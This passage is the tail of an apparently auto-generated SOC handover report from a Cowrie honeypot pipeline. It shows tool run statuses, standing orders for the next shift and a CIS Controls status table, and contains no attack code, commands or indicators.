| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 4 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 59 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 9 filtered (8.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 48 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 24 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 59 priority case(s) shown individually · 25 recon entry/entries in table (9 group(s) consolidating 24 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-01T22:58:52Z_
